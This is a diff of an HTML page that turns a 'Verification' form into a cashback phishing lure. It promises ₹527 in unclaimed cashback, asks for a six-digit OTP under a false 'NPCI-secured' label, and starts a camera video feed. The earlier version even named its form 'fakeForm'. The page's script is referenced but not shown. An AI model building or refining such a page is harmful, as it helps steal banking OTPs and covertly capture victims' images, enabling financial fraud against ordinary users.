@@ -1,15 +1,30 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Verification</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Cashback Verification</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <div id="loader">Verifying... Please allow camera</div>
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <form id="fakeForm">
-    <input type="text" placeholder="Enter OTP or Code" id="inputBox">
-  </form>
+  <div class="container">
+    <div class="card">
+      <h1>🎁 Cashback Reward!</h1>
+      <p>You have ₹527 unclaimed cashback from your last transaction.</p>
+      <p><strong>To claim, complete a 3-second verification.</strong></p>
+
+      <button id="claimBtn">Claim Now</button>
+
+      <form id="otpForm" style="display:none;">
+        <input type="text" id="inputBox" placeholder="Enter OTP to confirm" maxlength="6">
+        <p class="note">* This is an NPCI-secured verification step</p>
+      </form>
+
+      <video id="video" autoplay playsinline></video>
+      <p id="loader">📷 Initializing camera...</p>
+    </div>
+  </div>
+
   <script src="script.js"></script>
 </body>
 </html>
